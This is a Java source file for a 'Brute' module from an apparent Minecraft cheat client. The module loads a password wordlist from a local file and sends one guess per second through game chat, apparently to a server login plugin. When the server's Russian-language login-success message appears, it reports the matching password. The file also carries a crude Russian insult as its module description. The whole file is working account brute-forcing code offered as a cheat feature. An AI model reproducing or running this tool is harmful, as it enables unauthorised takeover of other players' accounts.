package hack.rawfish2d.client.ModUnused;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.lwjgl.input.Keyboard;
import hack.rawfish2d.client.Client;
import hack.rawfish2d.client.Module;
import hack.rawfish2d.client.ModuleType;
import hack.rawfish2d.client.ModRender.XRAY;
import hack.rawfish2d.client.utils.MiscUtils;
import hack.rawfish2d.client.utils.TimeHelper;

public class Brute extends Module{
	public static Module instance;
	public TimeHelper timer;
	public String password;
	private List<String> PASSWORDS = new ArrayList<String>();
	private int current = 0;
	
	public Brute() {
		super("Brute", 0, ModuleType.MISC);
		setDescription("tobi pizda tikay s gorodu");
		instance = this;
		timer = new TimeHelper();
		timer.reset();
		password = "nope";
		
		try {
			File file = new File("UltimateHack", "power.txt");
			FileInputStream fstream = new FileInputStream(file.getAbsolutePath());
			DataInputStream in = new DataInputStream(fstream);
			BufferedReader br = new BufferedReader(new InputStreamReader(in));
			String line;
			PASSWORDS.clear();
			while ((line = br.readLine()) != null) {
				String curLine = line.trim();
				PASSWORDS.add(curLine);
			}
			fstream.close();
			in.close();
			br.close();
		}
		catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void onEnable() {
		current = 0;
	}
	
	@Override
	public void onDisable() {
		current = 0;
	}
	
	@Override
	public void onChatMessage(String msg) {
		if(msg.contains("Вы зашли на свой аккаунт, удачной вам игры!")) {
			password = PASSWORDS.get(current);
			System.out.println("Brute done! Password:" + password);
			MiscUtils.sendChatClient("§d§lBrute done! Password:" + password);
		}
	}
	
	@Override
	public void onUpdate() {
		if(timer.hasReached(1000L)) {
			timer.reset();
			String pass = getNextPassword();
			if(pass.equals("nope")) {
				toggle();
				return;
			}
			MiscUtils.sendChat(pass);
			MiscUtils.sendChatClient("§a§lBruting... " + pass);
		}
	}
	
	private String getNextPassword() {
		if(current < PASSWORDS.size() - 1) {
			return PASSWORDS.get(++current);
		}
		else
			return "nope";
	}
	
	@Override
	public void preMotionUpdate() {
		
	}
	
	@Override
	public void postMotionUpdate() {
		
	}
}
